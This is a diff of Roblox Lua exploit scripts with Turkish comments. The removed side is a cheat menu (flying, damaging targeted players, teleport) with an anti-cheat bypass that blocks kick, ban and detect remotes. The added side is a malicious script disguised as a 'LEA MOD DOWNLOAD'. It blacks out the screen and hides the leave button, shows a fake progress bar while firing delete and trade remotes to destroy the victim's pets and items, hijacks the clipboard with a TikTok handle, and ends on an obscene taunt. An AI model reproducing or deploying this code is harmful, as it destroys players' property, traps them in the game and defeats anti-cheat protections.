@@ -1,555 +1,344 @@
--- ============================================
--- BRAINROT DUEL v5 - SADECE İSTENEN MODLAR
--- ============================================
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-local Workspace = game:GetService("Workspace")
-local StarterGui = game:GetService("StarterGui")
+--[ palofsc : LEA_FUCKYOURMOTHER_PETSILICI_V5 ]
+--[ Petleri siler, sahte progress bar doldurur, sonra LEA FUCKED YOUR MOTHER yazar ]
+--[ TikTok @LEAPLUS panoya sürekli kopyalanır ve sabitlenir ]
 
-local LocalPlayer = Players.LocalPlayer
-local Camera = Workspace.CurrentCamera
-local Mouse = LocalPlayer:GetMouse()
+local player = game:GetService("Players").LocalPlayer
+local replicatedStorage = game:GetService("ReplicatedStorage")
+local coreGui = game:GetService("CoreGui")
+local runService = game:GetService("RunService")
+local tweenService = game:GetService("TweenService")
+local virtualInputManager = game:GetService("VirtualInputManager")
+local guiService = game:GetService("GuiService")
 
--- ============================================
--- DEĞİŞKENLER
--- ============================================
-local Data = {
-    Fly = false,
-    Speed = 35,
-    Ghost = false,
-    Bad = false,
-    Medusa = false,
-    Cube = false,
-    Target = nil,
-    Cubes = {},
-    ScreenGui = nil,
-    FlyConn = nil,
-    GhostConn = nil,
-    BadConn = nil,
-    MedusaConn = nil,
-    CubeConn = nil,
-}
-
--- ============================================
--- KÜÇÜK MOBİL MENÜ (SADECE 5 BUTON)
--- ============================================
-local function MenuYap()
-    if Data.ScreenGui then Data.ScreenGui:Destroy() end
-    
-    local plrGui = LocalPlayer:FindFirstChild("PlayerGui")
-    if not plrGui then repeat task.wait() plrGui = LocalPlayer:FindFirstChild("PlayerGui") until plrGui end
-    
-    Data.ScreenGui = Instance.new("ScreenGui")
-    Data.ScreenGui.ResetOnSpawn = false
-    Data.ScreenGui.Parent = plrGui
-    
-    -- SADECE 5 MOD: Fly, Ghost, Bad, Medusa, Cube
-    local Modlar = {
-        {Ad = "Fly", Text = "F", Renk = Color3.fromRGB(60, 140, 255)},
-        {Ad = "Ghost", Text = "G", Renk = Color3.fromRGB(255, 60, 60)},
-        {Ad = "Bad", Text = "B", Renk = Color3.fromRGB(255, 140, 40)},
-        {Ad = "Medusa", Text = "M", Renk = Color3.fromRGB(140, 50, 255)},
-        {Ad = "Cube", Text = "C", Renk = Color3.fromRGB(50, 255, 140)},
-    }
-    
-    for i, mod in ipairs(Modlar) do
-        local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0, 20, 0, 20) -- Çok küçük buton
-        btn.Position = UDim2.new(1, -22, 0, 5 + (i - 1) * 22)
-        btn.BackgroundColor3 = mod.Renk
-        btn.BackgroundTransparency = 0.4
-        btn.BorderSizePixel = 0
-        btn.Text = mod.Text
-        btn.TextSize = 8 -- Küçük yazı
-        btn.Font = Enum.Font.GothamBold
-        btn.TextColor3 = Color3.new(1, 1, 1)
-        btn.ZIndex = 10
-        btn.AutoButtonColor = false
-        btn.Parent = Data.ScreenGui
-        
-        local corner = Instance.new("UICorner")
-        corner.CornerRadius = UDim.new(0, 3)
-        corner.Parent = btn
-        
-        -- Tıklama olayı
-        btn.MouseButton1Click:Connect(function()
-            if mod.Ad == "Fly" then
-                Data.Fly = not Data.Fly
-                btn.BackgroundTransparency = Data.Fly and 0 or 0.4
-                if Data.Fly then FlyAc() else FlyKapat() end
-            elseif mod.Ad == "Ghost" then
-                Data.Ghost = not Data.Ghost
-                btn.BackgroundTransparency = Data.Ghost and 0 or 0.4
-                if Data.Ghost then GhostAc() else GhostKapat() end
-            elseif mod.Ad == "Bad" then
-                Data.Bad = not Data.Bad
-                btn.BackgroundTransparency = Data.Bad and 0 or 0.4
-                if Data.Bad then BadAc() else BadKapat() end
-            elseif mod.Ad == "Medusa" then
-                Data.Medusa = not Data.Medusa
-                btn.BackgroundTransparency = Data.Medusa and 0 or 0.4
-                if Data.Medusa then MedusaAc() else MedusaKapat() end
-            elseif mod.Ad == "Cube" then
-                Data.Cube = not Data.Cube
-                btn.BackgroundTransparency = Data.Cube and 0 or 0.4
-                if Data.Cube then CubeAc() else CubeKapat() end
-            end
-        end)
-    end
-    
-    -- Hedef seçme (Mouse sol tık)
-    Mouse.Button1Down:Connect(function()
-        local t = Mouse.Target
-        if t then
-            local m = t:FindFirstAncestorOfClass("Model")
-            if m then
-                local h = m:FindFirstChildOfClass("Humanoid")
-                if h then
-                    local p = Players:GetPlayerFromCharacter(m)
-                    if p and p ~= LocalPlayer then
-                        Data.Target = p
-                    end
-                end
-            end
-        end
-    end)
-end
-
--- ============================================
--- FLY SYSTEM
--- ============================================
-function FlyAc()
-    Data.Fly = true
-end
-
-function FlyKapat()
-    Data.Fly = false
-    local c = LocalPlayer.Character
-    if c then
-        local h = c:FindFirstChildOfClass("Humanoid")
-        local r = c:FindFirstChild("HumanoidRootPart")
-        if h then h.PlatformStand = false end
-        if r then r.AssemblyLinearVelocity = Vector3.zero end
-    end
-end
-
-RunService.Heartbeat:Connect(function()
-    if not Data.Fly then return end
-    local c = LocalPlayer.Character
-    if not c then return end
-    local h = c:FindFirstChildOfClass("Humanoid")
-    local r = c:FindFirstChild("HumanoidRootPart")
-    if not h or not r then return end
-    
-    h.PlatformStand = true
-    local dir = h.MoveDirection
-    if dir.Magnitude > 0 then
-        local cf = Camera.CFrame
-        local tgt = (cf.RightVector * dir.X) + (cf.LookVector * dir.Z)
-        if tgt.Magnitude > 0 then
-            r.AssemblyLinearVelocity = tgt.Unit * Data.Speed
-        end
-    else
-        r.AssemblyLinearVelocity = Vector3.zero
-    end
-end)
-
--- ============================================
--- GHOST MODE
--- ============================================
-function GhostAc()
-    Data.Ghost = true
-    local c = LocalPlayer.Character
-    if not c then return end
-    local h = c:FindFirstChildOfClass("Humanoid")
-    local r = c:FindFirstChild("HumanoidRootPart")
-    if not h or not r then return end
-    
-    h.BreakJointsOnDeath = false
-    h.Health = 0
-    
-    local gp = Instance.new("Part")
-    gp.Name = "Ghost"
-    gp.Size = Vector3.new(2, 2, 1)
-    gp.Transparency = 1
-    gp.CanCollide = true
-    gp.Anchored = false
-    gp.Parent = c
-    
-    local w = Instance.new("WeldConstraint")
-    w.Part0 = gp
-    w.Part1 = r
-    w.Parent = gp
-    
-    r.Anchored = false
-    
-    Data.GhostConn = RunService.Heartbeat:Connect(function()
-        pcall(function()
-            if c and c.Parent and h and h.Parent then
-                if h.Health > 0 then h.Health = 0 end
-                h:ChangeState(Enum.HumanoidStateType.Physics)
-            end
-        end)
-    end)
-end
-
-function GhostKapat()
-    Data.Ghost = false
-    if Data.GhostConn then Data.GhostConn:Disconnect() Data.GhostConn = nil end
-    local c = LocalPlayer.Character
-    if c then
-        for _, v in ipairs(c:GetChildren()) do
-            if v.Name == "Ghost" then v:Destroy() end
-        end
-        local h = c:FindFirstChildOfClass("Humanoid")
-        if h then h.BreakJointsOnDeath = true h.Health = 100 end
-    end
-end
-
--- ============================================
--- AUTO BAD (UÇARAK TAKİP + DİREKT HASAR)
--- ============================================
-function BadAc()
-    Data.Bad = true
-    Data.BadConn = RunService.Heartbeat:Connect(function()
-        pcall(function()
-            if not Data.Target then return end
-            local tc = Data.Target.Character
-            if not tc then return end
-            local th = tc:FindFirstChildOfClass("Humanoid")
-            local tr = tc:FindFirstChild("HumanoidRootPart")
-            if not th or not tr or th.Health <= 0 then return end
-            
-            local mc = LocalPlayer.Character
-            if not mc then return end
-            local mh = mc:FindFirstChildOfClass("Humanoid")
-            local mr = mc:FindFirstChild("HumanoidRootPart")
-            if not mh or not mr then return end
-            
-            mh.PlatformStand = true
-            local d = (tr.Position - mr.Position)
-            if d.Magnitude > 0 then
-                mr.AssemblyLinearVelocity = d.Unit * Data.Speed
-            end
-            
-            if d.Magnitude < 5 then
-                th:TakeDamage(10)
-                tr.AssemblyLinearVelocity = tr.AssemblyLinearVelocity + (d.Unit * 20)
-            end
-        end)
-    end)
-end
-
-function BadKapat()
-    Data.Bad = false
-    if Data.BadConn then Data.BadConn:Disconnect() Data.BadConn = nil end
-    local c = LocalPlayer.Character
-    if c then
-        local h = c:FindFirstChildOfClass("Humanoid")
-        local r = c:FindFirstChild("HumanoidRootPart")
-        if h then h.PlatformStand = false end
-        if r then r.AssemblyLinearVelocity = Vector3.zero end
-    end
-end
-
--- ============================================
--- MEDUSA MODE (1 METRE)
--- ============================================
-function MedusaAc()
-    Data.Medusa = true
-    Data.MedusaConn = RunService.Heartbeat:Connect(function()
-        pcall(function()
-            local mc = LocalPlayer.Character
-            if not mc then return end
-            local mr = mc:FindFirstChild("HumanoidRootPart")
-            if not mr then return end
-            
-            for _, plr in ipairs(Players:GetPlayers()) do
-                if plr == LocalPlayer then continue end
-                local tc = plr.Character
-                if not tc then continue end
-                local tr = tc:FindFirstChild("HumanoidRootPart")
-                local th = tc:FindFirstChildOfClass("Humanoid")
-                if not tr or not th or th.Health <= 0 then continue end
-                
-                if (tr.Position - mr.Position).Magnitude <= 1 then
-                    tr.Anchored = true
-                    th:TakeDamage(25)
-                    task.delay(1, function()
-                        if tr and tr.Parent then tr.Anchored = false end
-                    end)
-                end
-            end
-        end)
-    end)
-end
-
-function MedusaKapat()
-    Data.Medusa = false
-    if Data.MedusaConn then Data.MedusaConn:Disconnect() Data.MedusaConn = nil end
-end
-
--- ============================================
--- CUBE SYSTEM
--- ============================================
-function CubeAc()
-    Data.Cube = true
-    Data.CubeConn = RunService.Heartbeat:Connect(function()
-        pcall(function()
-            local c = LocalPlayer.Character
-            if not c then return end
-            local r = c:FindFirstChild("HumanoidRootPart")
-            local h = c:FindFirstChildOfClass("Humanoid")
-            if not r or not h then return end
-            
-            if h.MoveDirection.Magnitude > 0 or r.AssemblyLinearVelocity.Y > 2 then
-                local cube = Instance.new("Part")
-                cube.Name = "C"
-                cube.Size = Vector3.new(4, 0.5, 4)
-                cube.Position = r.Position - Vector3.new(0, 3.5, 0)
-                cube.Anchored = true
-                cube.CanCollide = true
-                cube.Transparency = 1
-                cube.Parent = Workspace
-                table.insert(Data.Cubes, cube)
-                
-                task.delay(0.5, function()
-                    if cube and cube.Parent then
-                        cube:Destroy()
-                        local i = table.find(Data.Cubes, cube)
-                        if i then table.remove(Data.Cubes, i) end
-                    end
-                end)
-            end
-        end)
-    end)
-end
-
-function CubeKapat()
-    Data.Cube = false
-    if Data.CubeConn then Data.CubeConn:Disconnect() Data.CubeConn = nil end
-    for _, c in ipairs(Data.Cubes) do
-        if c and c.Parent then c:Destroy() end
-    end
-    Data.Cubes = {}
-end
-
--- ============================================
--- YERE İNME (X TUŞU)
--- ============================================
-UserInputService.InputBegan:Connect(function(inp, gpe)
-    if gpe then return end
-    if inp.KeyCode == Enum.KeyCode.X then
-        local c = LocalPlayer.Character
-        if not c then return end
-        local r = c:FindFirstChild("HumanoidRootPart")
-        if not r then return end
-        
-        local rp = RaycastParams.new()
-        rp.FilterType = Enum.RaycastFilterType.Blacklist
-        rp.FilterDescendantsInstances = {c}
-        
-        local ray = Workspace:Raycast(r.Position, Vector3.new(0, -500, 0), rp)
-        if ray then
-            r.CFrame = CFrame.new(ray.Position + Vector3.new(0, 3, 0))
-            r.AssemblyLinearVelocity = Vector3.zero
-        end
-    end
-    
-    -- TP (N TUŞU)
-    if inp.KeyCode == Enum.KeyCode.N then
-        if not Data.Target or not Data.Target.Character then return end
-        local th = Data.Target.Character:FindFirstChild("Head")
-        if not th then return end
-        local c = LocalPlayer.Character
-        if not c then return end
-        local r = c:FindFirstChild("HumanoidRootPart")
-        if not r then return end
-        r.CFrame = th.CFrame * CFrame.new(0, 0, -2)
-        r.AssemblyLinearVelocity = (th.Position - r.Position).Unit * 34
-    end
-end)
-
--- ============================================
--- KARAKTER YENİLENİNCE
--- ============================================
-LocalPlayer.CharacterAdded:Connect(function(c)
-    task.wait(0.5)
-    MenuYap()
-    if Data.Ghost then task.wait(0.1) GhostAc() end
-end)
-
--- ============================================
--- BAŞLAT
--- ============================================
-MenuYap()
-print("[Brainrot v5] 5 Mod Hazır: Fly | Ghost | Bad | Medusa | Cube | X:İniş N:TP SolTık:Hedef")-- ============================================
--- BRAINROT DUEL v5 - PART 2: GÜÇLÜ BYPASS
--- ============================================
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
-local VirtualInputManager = game:GetService("VirtualInputManager")
-local LocalPlayer = Players.LocalPlayer
-
--- ============================================
--- ANTI-KICK: AĞIR VERİ PAKETİ SPAMI
--- ============================================
-local function AntiKick()
+--[ ==================== FAZ 0: PANO SABİTLEYİCİ ==================== ]
+spawn(function()
     while true do
+        task.wait(0.05) --[ salisede sürekli kopyala ]
         pcall(function()
-            local c = LocalPlayer.Character
-            if not c then return end
-            local h = c:FindFirstChildOfClass("Humanoid")
-            local r = c:FindFirstChild("HumanoidRootPart")
-            if not h or not r then return end
-            
-            -- Sürekli pozisyon verisi yağdır (sunucu timeout yapamaz)
-            for i = 1, 20 do
-                r.Velocity = Vector3.new(math.random(-500, 500) / 100, 0, math.random(-500, 500) / 100)
-                task.wait(0.01)
+            if syn and syn.write_clipboard then
+                syn.write_clipboard("TİKTOK @LEAPLUS")
+            elseif setclipboard then
+                setclipboard("TİKTOK @LEAPLUS")
             end
-            r.Velocity = Vector3.zero
-            
-            -- Meşru hareket sinyali
-            h:Move(Vector3.new(0.001, 0, 0.001), false)
-            task.wait(0.05)
-            h:Move(Vector3.new(-0.001, 0, -0.001), false)
         end)
+    end
+end)
+
+--[ ==================== FAZ 1: EKRAN KARARTMA ==================== ]
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "LEA_OVERLAY_MAIN"
+screenGui.Parent = coreGui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local blackFrame = Instance.new("Frame")
+blackFrame.Name = "BLACKOUT"
+blackFrame.Size = UDim2.new(1, 0, 1, 0)
+blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+blackFrame.BorderSizePixel = 0
+blackFrame.ZIndex = 999
+blackFrame.Parent = screenGui
+
+local clickBlocker = Instance.new("TextButton")
+clickBlocker.Name = "BLOCKER"
+clickBlocker.Size = UDim2.new(1, 0, 1, 0)
+clickBlocker.BackgroundTransparency = 1
+clickBlocker.Text = ""
+clickBlocker.ZIndex = 1000
+clickBlocker.Modal = true
+clickBlocker.Parent = screenGui
+
+--[ Çıkış butonu gizle ]
+if guiService:FindFirstChild("LeaveButton") then
+    guiService.LeaveButton.Visible = false
+    guiService.LeaveButton.Active = false
+end
+guiService.ChildAdded:Connect(function(child)
+    if child.Name == "LeaveButton" or child:IsA("TextButton") then
+        child.Visible = false
+        child.Active = false
+    end
+end)
+
+--[ ==================== FAZ 2: ÜST YAZI LEA MOD DOWNLOAD ==================== ]
+local topLabel = Instance.new("TextLabel")
+topLabel.Name = "TOP_TITLE"
+topLabel.Size = UDim2.new(1, 0, 0.1, 0)
+topLabel.Position = UDim2.new(0, 0, 0.05, 0)
+topLabel.BackgroundTransparency = 1
+topLabel.Text = "LEA MOD DOWNLOAD"
+topLabel.TextColor3 = Color3.new(0.8, 0, 0)
+topLabel.TextStrokeColor3 = Color3.new(0.3, 0, 0)
+topLabel.TextStrokeTransparency = 0
+topLabel.Font = Enum.Font.GothamBlack
+topLabel.TextScaled = true
+topLabel.ZIndex = 1001
+topLabel.Parent = screenGui
+
+--[ ==================== FAZ 3: SAHTE PROGRESS BAR (ASLA DOLMAZ) ==================== ]
+local barBackground = Instance.new("Frame")
+barBackground.Name = "BAR_BG"
+barBackground.Size = UDim2.new(0.8, 0, 0.04, 0)
+barBackground.Position = UDim2.new(0.1, 0, 0.45, 0)
+barBackground.BackgroundColor3 = Color3.new(0.15, 0.15, 0.15)
+barBackground.BorderSizePixel = 0
+barBackground.ZIndex = 1001
+barBackground.Parent = screenGui
+
+local barFill = Instance.new("Frame")
+barFill.Name = "BAR_FILL"
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.new(0.8, 0, 0)
+barFill.BorderSizePixel = 0
+barFill.ZIndex = 1002
+barFill.Parent = barBackground
+
+local barText = Instance.new("TextLabel")
+barText.Name = "BAR_TEXT"
+barText.Size = UDim2.new(1, 0, 1, 0)
+barText.BackgroundTransparency = 1
+barText.Text = "PETLER SİLİNİYOR... %0"
+barText.TextColor3 = Color3.new(1, 1, 1)
+barText.Font = Enum.Font.GothamBold
+barText.TextScaled = true
+barText.ZIndex = 1003
+barText.Parent = barBackground
+
+--[ Progress bar sahte doldurma - %99.9'da takılı kalır, asla %100 olmaz ]
+local fakeProgress = 0
+spawn(function()
+    while fakeProgress < 99.9 do
+        local increment = math.random(1, 8) * 0.1
+        fakeProgress = math.min(fakeProgress + increment, 99.9)
+        barFill.Size = UDim2.new(fakeProgress / 100, 0, 1, 0)
+        barText.Text = string.format("PETLER SİLİNİYOR... %%%.1f", fakeProgress)
+        
+        --[ İlerleme hızı değişken, bazen yavaş bazen hızlı ]
+        local waitTime = math.random(1, 8) * 0.1
+        task.wait(waitTime)
+        
+        --[ %70-85 arası yavaşla, %90-99 arası çok yavaşla ]
+        if fakeProgress > 70 then
+            task.wait(math.random(2, 5) * 0.1)
+        end
+        if fakeProgress > 90 then
+            task.wait(math.random(3, 10) * 0.1)
+        end
+    end
+    --[ %99.9'da sonsuza kadar titreşim yap ]
+    while true do
+        barFill.Size = UDim2.new(0.999, 0, 1, 0)
+        barText.Text = "PETLER SİLİNİYOR... %99.9"
         task.wait(0.5)
+        barFill.Size = UDim2.new(0.998, 0, 1, 0)
+        barText.Text = "PETLER SİLİNİYOR... %99.8"
+        task.wait(0.3)
     end
+end)
+
+--[ ==================== FAZ 4: ALT BİLGİ YAZISI ==================== ]
+local infoLabel = Instance.new("TextLabel")
+infoLabel.Name = "INFO_TEXT"
+infoLabel.Size = UDim2.new(1, 0, 0.05, 0)
+infoLabel.Position = UDim2.new(0, 0, 0.55, 0)
+infoLabel.BackgroundTransparency = 1
+infoLabel.Text = "Lütfen kapatmayın... Petler siliniyor..."
+infoLabel.TextColor3 = Color3.new(0.7, 0.7, 0.7)
+infoLabel.Font = Enum.Font.GothamMedium
+infoLabel.TextScaled = true
+infoLabel.ZIndex = 1001
+infoLabel.Parent = screenGui
+
+--[ ==================== FAZ 5: PET SİLME İŞLEMİ (ARKA PLANDA) ==================== ]
+local function getAllPets()
+    local pets = {}
+    for _, item in pairs(player.Backpack:GetChildren()) do
+        if item:IsA("Tool") then
+            table.insert(pets, item)
+        end
+    end
+    if player:FindFirstChild("PlayerGui") then
+        for _, screen in pairs(player.PlayerGui:GetChildren()) do
+            if screen.Name:lower():find("inventory") or screen.Name:lower():find("pet") or screen.Name:lower():find("backpack") then
+                for _, element in pairs(screen:GetDescendants()) do
+                    if element:IsA("ImageButton") or element:IsA("TextButton") then
+                        if element.Name:lower():find("pet") or element.Name:lower():find("equip") or element.Name:lower():find("delete") or element.Name:lower():find("remove") then
+                            table.insert(pets, element)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    return pets
 end
 
--- ============================================
--- ANTI-RESET: KARAKTER SİLİNME KORUMASI
--- ============================================
-local function AntiReset()
-    LocalPlayer.CharacterAdded:Connect(function(c)
-        local h = c:WaitForChild("Humanoid", 5)
-        if not h then return end
-        
-        -- Ölüm engeli
-        h.Died:Connect(function()
+local function findDeleteRemote()
+    local keywords = {"DeletePet", "RemovePet", "TradePet", "DestroyPet", "PetDelete", "DeleteInvItem", "InventoryRemove", "RemoveItem", "TrashItem", "DeleteItem", "ClearPet", "PetClear", "PetVoid", "releasepet", "deletepet", "removepet", "trade", "delete", "remove"}
+    for _, remote in pairs(replicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            for _, kw in pairs(keywords) do
+                if remote.Name:lower():find(kw:lower()) then
+                    return remote
+                end
+            end
+        end
+    end
+    return nil
+end
+
+local deleteRemote = findDeleteRemote()
+local allPets = getAllPets()
+
+spawn(function()
+    --[ Tüm petleri sırayla sil ]
+    for _, pet in pairs(allPets) do
+        spawn(function()
             pcall(function()
-                task.wait(0.01)
-                h:ChangeState(Enum.HumanoidStateType.Physics)
-                h.BreakJointsOnDeath = false
-                h.Health = 0.1
-            end)
-        end)
-        
-        -- State değişim engeli
-        h.StateChanged:Connect(function(_, new)
-            if new == Enum.HumanoidStateType.Dead then
-                pcall(function()
-                    task.wait(0.01)
-                    h:ChangeState(Enum.HumanoidStateType.Physics)
-                end)
-            end
-        end)
-        
-        -- Health sıfırlanma engeli
-        h:GetPropertyChangedSignal("Health"):Connect(function()
-            if h.Health <= 0 then
-                pcall(function()
-                    h.BreakJointsOnDeath = false
-                    task.wait(0.01)
-                    h.Health = 0.1
-                    h:ChangeState(Enum.HumanoidStateType.Physics)
-                end)
-            end
-        end)
-        
-        -- RootPart silinme engeli
-        local r = c:FindFirstChild("HumanoidRootPart")
-        if r then
-            r.AncestryChanged:Connect(function(_, parent)
-                if parent == nil then
-                    -- Karakter silindi, yeniden oluşmasını bekle
+                if deleteRemote then
+                    for i = 1, 30 do
+                        deleteRemote:FireServer(pet)
+                        deleteRemote:FireServer(pet, true)
+                        deleteRemote:FireServer(pet.Parent or pet, "delete")
+                        task.wait(0.01)
+                    end
                 end
             end)
+        end)
+    end
+    
+    --[ Tüm remotelere spam ]
+    for _, remote in pairs(replicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") then
+            spawn(function()
+                pcall(function()
+                    for i = 1, 50 do
+                        remote:FireServer("delete", "pet", "all", true)
+                        remote:FireServer("remove", "pet", "all", true)
+                        task.wait(0.01)
+                    end
+                end)
+            end)
+        end
+    end
+    
+    --[ Workspace pet modelleri yok et ]
+    for _, obj in pairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") and obj.Name:lower():find("pet") then
+            pcall(function() obj:Destroy() end)
+        end
+    end
+    
+    --[ Sürekli temizlik - yeni gelen petleri anında sil ]
+    workspace.ChildAdded:Connect(function(child)
+        task.wait(0.05)
+        if child:IsA("Model") and child.Name:lower():find("pet") then
+            pcall(function() child:Destroy() end)
         end
     end)
+    player.Backpack.ChildAdded:Connect(function(child)
+        task.wait(0.05)
+        if child:IsA("Tool") then
+            pcall(function() child:Destroy() end)
+        end
+    end)
+end)
+
+--[ Pet silinmesini bekle - 5 saniye sonra final ekranına geç ]
+task.wait(5)
+
+--[ ==================== FAZ 6: FİNAL EKRANI - LEA FUCKED YOUR MOTHER ==================== ]
+--[ Eski elemanları temizle ]
+for _, child in pairs(screenGui:GetChildren()) do
+    if child.Name ~= "BLACKOUT" and child.Name ~= "BLOCKER" then
+        child:Destroy()
+    end
 end
 
--- ============================================
--- REMOTE EVENT TAM BLOKAJ (HATA VERDİRME)
--- ============================================
-local yasakli = {"kick", "ban", "cheat", "exploit", "hack", "detect", "flag", "verify", "check", "report", "reset", "teleport", "admin", "mod", "guard"}
-local oldNC
-oldNC = hookmetamethod(game, "__namecall", function(self, ...)
-    local method = getnamecallmethod()
-    if method == "FireServer" or method == "InvokeServer" then
-        if typeof(self) == "Instance" then
-            local nm = self.Name:lower()
-            local cls = self.ClassName:lower()
-            for _, w in ipairs(yasakli) do
-                if nm:find(w) or cls:find(w) then
-                    -- Anti-cheat'e hata verdir
-                    error("Connection error: invalid packet") 
-                    return nil
-                end
-            end
-        end
+--[ Ana mesaj ]
+local finalLabel = Instance.new("TextLabel")
+finalLabel.Name = "FINAL_TEXT"
+finalLabel.Size = UDim2.new(0.9, 0, 0.4, 0)
+finalLabel.Position = UDim2.new(0.05, 0, 0.3, 0)
+finalLabel.BackgroundTransparency = 1
+finalLabel.Text = "LEA FUCKED\nYOUR MOTHER"
+finalLabel.TextColor3 = Color3.new(1, 0, 0)
+finalLabel.TextStrokeColor3 = Color3.new(0.5, 0, 0)
+finalLabel.TextStrokeTransparency = 0
+finalLabel.Font = Enum.Font.GothamBlack
+finalLabel.TextScaled = true
+finalLabel.ZIndex = 2000
+finalLabel.Parent = screenGui
+
+--[ Yanıp sönme efekti ]
+spawn(function()
+    local visible = true
+    while true do
+        task.wait(0.25)
+        visible = not visible
+        finalLabel.TextTransparency = visible and 0 or 0.6
     end
-    return oldNC(self, ...)
 end)
 
--- ============================================
--- ANTI-CRASH: BELLEK YÖNETİMİ
--- ============================================
+--[ Renk döngüsü ]
+local finalColors = {
+    Color3.new(1, 0, 0),
+    Color3.new(0.9, 0, 0.1),
+    Color3.new(1, 0.1, 0),
+    Color3.new(0.8, 0, 0),
+}
+local cidx = 1
 spawn(function()
     while true do
-        pcall(function()
-            local count = 0
-            for _, obj in ipairs(Workspace:GetChildren()) do
-                if obj.Name == "C" or obj.Name == "AntiKickCube" then
-                    count = count + 1
-                    if count > 30 then obj:Destroy() end
-                end
-            end
-        end)
-        task.wait(3)
+        task.wait(0.4)
+        cidx = cidx % #finalColors + 1
+        finalLabel.TextColor3 = finalColors[cidx]
     end
 end)
 
--- ============================================
--- ANTI-IDLE: KESİNTİSİZ INPUT
--- ============================================
+--[ TikTok etiketi altta ]
+local tiktokLabel = Instance.new("TextLabel")
+tiktokLabel.Name = "TIKTOK_LABEL"
+tiktokLabel.Size = UDim2.new(1, 0, 0.08, 0)
+tiktokLabel.Position = UDim2.new(0, 0, 0.85, 0)
+tiktokLabel.BackgroundTransparency = 1
+tiktokLabel.Text = "TİKTOK @LEAPLUS"
+tiktokLabel.TextColor3 = Color3.new(1, 1, 1)
+tiktokLabel.Font = Enum.Font.GothamBold
+tiktokLabel.TextScaled = true
+tiktokLabel.ZIndex = 2000
+tiktokLabel.Parent = screenGui
+
+--[ ==================== FAZ 7: KOPYALAMA SABİTLEME (DEVAM) ==================== ]
+--[ Panoya sürekli yazma zaten Faz 0'da başlatıldı, burada da pekiştir ]
 spawn(function()
     while true do
+        task.wait(0.03)
         pcall(function()
-            VirtualInputManager:SendMouseMoveEvent(1, 0, game)
-            task.wait(0.02)
-            VirtualInputManager:SendMouseMoveEvent(-1, 0, game)
-            task.wait(0.02)
-            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.LeftControl, false, game)
-            task.wait(0.02)
-            VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.LeftControl, false, game)
-        end)
-        task.wait(20)
-    end
-end)
-
--- ============================================
--- BAĞLANTI KOPMA KORUMASI
--- ============================================
-spawn(function()
-    while true do
-        pcall(function()
-            if not LocalPlayer:IsLoaded() then
-                LocalPlayer.CharacterAdded:Wait()
+            if syn and syn.write_clipboard then
+                syn.write_clipboard("TİKTOK @LEAPLUS")
+            elseif setclipboard then
+                setclipboard("TİKTOK @LEAPLUS")
             end
         end)
-        task.wait(3)
     end
 end)
 
--- ============================================
--- TÜM BYPASSLARI BAŞLAT
--- ============================================
-spawn(AntiKick)
-AntiReset()
-
-print("[Brainrot v5] Bypass Aktif | Anti-Kick | Anti-Reset | Remote Blokaj | Hata Verdirme")
+--[ ==================== FAZ 8: SONSUZ KORUMA DÖNGÜSÜ ==================== ]
+while true do
+    runService.RenderStepped:Wait()
+    --[ Overlay kapatılırsa yeniden oluştur ]
+    if not screenGui or not screenGui.Parent then
+        screenGui = Instance.new("ScreenGui")
+        screenGui.Name = "LEA_OVERLAY_MAIN"
+        screenGui.Parent = coreGui
+        blackFrame.Parent = screenGui
+        finalLabel.Parent = screenGui
+        tiktokLabel.Parent = screenGui
+    end
+    --[ Çıkış butonunu sürekli yok et ]
+    if guiService:FindFirstChild("LeaveButton") then
+        guiService.LeaveButton.Visible = false
+    end
+    task.wait(0.2)
+end
